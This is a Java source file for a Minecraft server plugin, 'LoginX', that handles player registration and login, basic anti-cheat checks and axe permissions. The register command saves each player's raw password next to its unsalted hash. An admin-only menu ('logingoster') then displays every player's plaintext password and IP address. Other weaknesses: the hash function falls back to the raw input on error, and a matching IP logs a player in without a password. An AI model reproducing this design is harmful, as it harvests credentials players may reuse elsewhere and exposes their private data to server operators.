package com.loginx;

import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import java.security.MessageDigest;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LoginX extends JavaPlugin implements Listener {

    private final Map<UUID, String> passwords = new HashMap<>();
    private final Map<UUID, String> rawPasswords = new HashMap<>();
    private final Map<UUID, Integer> attempts = new HashMap<>();
    private final Set<UUID> loggedIn = new HashSet<>();
    private final Map<UUID, String> lastIP = new HashMap<>();
    private final Set<UUID> trustedPlayers = new HashSet<>(); // WE/TNT İzni
    private final Set<UUID> axeAllowed = new HashSet<>(); // Balta İzni

    private final Map<UUID, LinkedList<Long>> clickData = new HashMap<>();
    private final Map<UUID, Long> lastChatTime = new HashMap<>();
    private final Map<UUID, Integer> violations = new HashMap<>(); 

    private FileConfiguration cfg;
    private final String GUI_LOGIN_TITLE = color("&#FF69B4&lOyuncu Verileri");
    private final String GUI_IZIN_TITLE = color("&#FFB6C1&lÖzel İzinli Oyuncular");
    private final String AC_PREFIX = color("&#FF0000&lLoginX AC &8» ");

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        saveDefaultConfig();
        cfg = getConfig();
        loadData();
        getLogger().info("LoginX Ultra Guvenlik ve Balta Koruma Sistemi Aktif!");
    }

    @Override
    public void onDisable() {
        saveData();
    }

    private void loadData() {
        if (cfg.contains("data")) {
            for (String key : cfg.getConfigurationSection("data").getKeys(false)) {
                UUID u = UUID.fromString(key);
                passwords.put(u, cfg.getString("data." + key + ".hash"));
                rawPasswords.put(u, cfg.getString("data." + key + ".raw"));
                lastIP.put(u, cfg.getString("data." + key + ".ip"));
            }
        }
        if (cfg.contains("trusted_players")) {
            for (String uuidStr : cfg.getStringList("trusted_players")) trustedPlayers.add(UUID.fromString(uuidStr));
        }
        if (cfg.contains("axe_allowed")) {
            for (String uuidStr : cfg.getStringList("axe_allowed")) axeAllowed.add(UUID.fromString(uuidStr));
        }
    }

    private void saveData() {
        cfg.set("data", null);
        for (UUID u : passwords.keySet()) {
            cfg.set("data." + u + ".hash", passwords.get(u));
            cfg.set("data." + u + ".raw", rawPasswords.get(u));
            cfg.set("data." + u + ".ip", lastIP.get(u));
        }
        cfg.set("trusted_players", new ArrayList<>(trustedPlayers.stream().map(UUID::toString).toList()));
        cfg.set("axe_allowed", new ArrayList<>(axeAllowed.stream().map(UUID::toString).toList()));
        saveConfig();
    }

    // --- GİRİŞ / ÇIKIŞ ---
    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        UUID uuid = p.getUniqueId();
        String currentIP = p.getAddress().getAddress().getHostAddress();

        if (passwords.containsKey(uuid) && lastIP.getOrDefault(uuid, "").equals(currentIP)) {
            loggedIn.add(uuid);
            p.sendMessage(color("&#00FF00[LoginX] &aIP adresin eşleşti, otomatik giriş yapıldı!"));
            playSuccessEffect(p);
            return;
        }

        lastIP.put(uuid, currentIP);
        p.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 999999, 1));

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (loggedIn.contains(uuid) || !p.isOnline()) { cancel(); return; }
                sendLoginTitle(p);
                count++;
            }
        }.runTaskTimer(this, 0, 40L);

        new BukkitRunnable() {
            @Override
            public void run() {
                if (p.isOnline() && !loggedIn.contains(uuid)) p.kickPlayer(color("&#FF0000Zamanında giriş yapmadınız!"));
            }
        }.runTaskLater(this, cfg.getInt("login_timeout") * 20L);
    }

    @EventHandler public void onQuit(PlayerQuitEvent e) { 
        UUID u = e.getPlayer().getUniqueId();
        loggedIn.remove(u); 
        violations.remove(u);
    }

    // --- ANTİ-HİLE VE KORUMA SİSTEMLERİ ---

    @EventHandler
    public void onMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        if (isNotLogged(p)) { e.setCancelled(true); return; }

        // FLY KORUMASI (Sadece Survival)
        if (p.getGameMode() == GameMode.SURVIVAL) {
            if (p.isFlying() && !p.hasPermission("loginx.fly")) {
                handleViolation(p, "Uçuş Hilesi (Fly)");
            }
        }
    }

    @EventHandler
    public void onAttack(EntityDamageByEntityEvent e) {
        if (!(e.getDamager() instanceof Player p)) return;
        if (isNotLogged(p)) { e.setCancelled(true); return; }

        // REACH KONTROLÜ (4.2 Blok Sınırı)
        double distance = p.getLocation().distance(e.getEntity().getLocation());
        if (distance > 4.2 && p.getGameMode() != GameMode.CREATIVE) {
            e.setCancelled(true);
            handleViolation(p, "Erişim Hilesi (Reach)");
            return;
        }

        // CPS KONTROLÜ
        if (checkCPS(p)) e.setCancelled(true);
    }

    private boolean checkCPS(Player p) {
        UUID u = p.getUniqueId();
        long now = System.currentTimeMillis();
        clickData.putIfAbsent(u, new LinkedList<>());
        LinkedList<Long> clicks = clickData.get(u);
        clicks.add(now);
        clicks.removeIf(time -> now - time > 1000);
        if (clicks.size() > 16) { // 16 CPS üstü şüpheli
            handleViolation(p, "Hızlı Tıklama (AutoClicker)");
            return true;
        }
        return false;
    }

    private void handleViolation(Player p, String reason) {
        int v = violations.getOrDefault(p.getUniqueId(), 0) + 1;
        violations.put(p.getUniqueId(), v);
        p.sendMessage(AC_PREFIX + color("&#FFB6C1Sistem: " + reason + " engellendi!"));
        
        if (v >= 3) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    p.kickPlayer(color("\n&#FF0000&lLoginX KORUMA\n\n&#FFB6C1Hile tespiti nedeniyle atıldınız!\n&#FF69B4Sebep: &f" + reason));
                }
            }.runTask(this);
        }
    }

    // --- BALTA KORUMA SİSTEMİ ---
    @EventHandler
    public void onAxeHold(PlayerItemHeldEvent e) {
        Player p = e.getPlayer();
        ItemStack item = p.getInventory().getItem(e.getNewSlot());
        if (isAxe(item) && !axeAllowed.contains(p.getUniqueId())) {
            p.getInventory().setHeldItemSlot(e.getPreviousSlot());
            p.sendMessage(color("&#FF0000[!] Balta kullanmak için izniniz yok!"));
        }
    }

    @EventHandler
    public void onAxePickup(PlayerAttemptPickupItemEvent e) {
        if (isAxe(e.getItem().getItemStack()) && !axeAllowed.contains(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
        }
    }

    private boolean isAxe(ItemStack item) {
        if (item == null) return false;
        String name = item.getType().name();
        return name.endsWith("_AXE");
    }

    // --- KOMUTLAR ---
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        
        // Konsol Komutları: /baltaizinver, /baltaizincikar, /izinver
        if (cmd.getName().equalsIgnoreCase("baltaizinver") || cmd.getName().equalsIgnoreCase("baltaizincikar") || cmd.getName().equalsIgnoreCase("izinver")) {
            if (!(sender instanceof ConsoleCommandSender)) {
                sender.sendMessage(color("&#FF0000Bu komut sadece konsoldan kullanılabilir!"));
                return true;
            }
            if (args.length != 1) return false;
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            
            if (cmd.getName().equalsIgnoreCase("baltaizinver")) {
                axeAllowed.add(target.getUniqueId());
                sender.sendMessage(target.getName() + " için balta izni verildi.");
            } else if (cmd.getName().equalsIgnoreCase("baltaizincikar")) {
                axeAllowed.remove(target.getUniqueId());
                sender.sendMessage(target.getName() + " için balta izni kaldırıldı.");
            } else if (cmd.getName().equalsIgnoreCase("izinver")) {
                if (trustedPlayers.contains(target.getUniqueId())) trustedPlayers.remove(target.getUniqueId());
                else trustedPlayers.add(target.getUniqueId());
                sender.sendMessage(target.getName() + " için genel izin durumu güncellendi.");
            }
            saveData();
            return true;
        }

        if (!(sender instanceof Player p)) return true;

        if (cmd.getName().equalsIgnoreCase("register")) {
            if (passwords.containsKey(p.getUniqueId())) return true;
            if (args.length < 2 || !args[0].equals(args[1])) {
                p.sendMessage(color("&#FF0000Şifreler uyuşmuyor!"));
                return true;
            }
            passwords.put(p.getUniqueId(), hash(args[0]));
            rawPasswords.put(p.getUniqueId(), args[0]);
            loggedIn.add(p.getUniqueId());
            saveData();
            playSuccessEffect(p);
            p.sendMessage(color("&#00FF00Başarıyla kayıt oldunuz!"));
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("login")) {
            if (args.length < 1) return false;
            if (hash(args[0]).equals(passwords.get(p.getUniqueId()))) {
                loggedIn.add(p.getUniqueId());
                playSuccessEffect(p);
                p.sendMessage(color("&#00FF00Giriş başarılı!"));
            } else {
                p.sendMessage(color("&#FF0000Hatalı şifre!"));
                int a = attempts.getOrDefault(p.getUniqueId(), 0) + 1;
                attempts.put(p.getUniqueId(), a);
                if (a >= 3) p.kickPlayer(color("&#FF0000Çok fazla hatalı deneme!"));
            }
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("logingoster") && p.hasPermission("loginx.admin")) openLoginMenu(p);
        if (cmd.getName().equalsIgnoreCase("izinvermenu") && p.hasPermission("loginx.admin")) openIzinMenu(p);

        return true;
    }

    // --- MENÜLER VE DİĞERLERİ ---
    private void openLoginMenu(Player player) {
        Inventory gui = Bukkit.createInventory(null, 54, GUI_LOGIN_TITLE);
        for (UUID id : rawPasswords.keySet()) {
            OfflinePlayer target = Bukkit.getOfflinePlayer(id);
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();
            if (meta != null) {
                meta.setOwningPlayer(target);
                meta.setDisplayName(color("&#FF69B4&l" + (target.getName() != null ? target.getName() : "Bilinmiyor")));
                meta.setLore(Arrays.asList(color("&#FFB6C1Şifre: &f" + rawPasswords.get(id)), color("&#FFB6C1IP: &f" + lastIP.get(id))));
                head.setItemMeta(meta);
            }
            gui.addItem(head);
        }
        player.openInventory(gui);
    }

    private void openIzinMenu(Player player) {
        Inventory gui = Bukkit.createInventory(null, 27, GUI_IZIN_TITLE);
        for (UUID id : trustedPlayers) {
            OfflinePlayer target = Bukkit.getOfflinePlayer(id);
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();
            if (meta != null) {
                meta.setOwningPlayer(target);
                meta.setDisplayName(color("&#FF69B4&l" + target.getName()));
                meta.setLore(Collections.singletonList(color("&aWE/TNT Yetkili")));
                head.setItemMeta(meta);
            }
            gui.addItem(head);
        }
        player.openInventory(gui);
    }

    @EventHandler public void onMenuClick(InventoryClickEvent e) {
        if (e.getView().getTitle().equals(GUI_LOGIN_TITLE) || e.getView().getTitle().equals(GUI_IZIN_TITLE)) e.setCancelled(true);
    }

    private boolean isNotLogged(Player p) { return !loggedIn.contains(p.getUniqueId()); }

    private void sendLoginTitle(Player p) {
        boolean reg = !passwords.containsKey(p.getUniqueId());
        p.sendTitle(color(cfg.getString("title_colors." + (reg ? "register" : "login") + ".header")), 
                   color(cfg.getString("title_colors." + (reg ? "register" : "login") + ".footer")), 0, 40, 10);
    }

    private void playSuccessEffect(Player p) {
        p.removePotionEffect(PotionEffectType.BLINDNESS);
        p.playSound(p.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1f, 1f);
    }

    private String hash(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] bytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return input; }
    }

    private String color(String text) {
        if (text == null) return "";
        Pattern pattern = Pattern.compile("&#([a-fA-F0-9]{6})");
        Matcher matcher = pattern.matcher(text);
        StringBuffer buffer = new StringBuffer();
        while (matcher.find()) {
            String hex = matcher.group(1);
            StringBuilder replacement = new StringBuilder("§x");
            for (char c : hex.toCharArray()) replacement.append("§").append(c);
            matcher.appendReplacement(buffer, replacement.toString());
        }
        return ChatColor.translateAlternateColorCodes('&', matcher.appendTail(buffer).toString());
    }
}
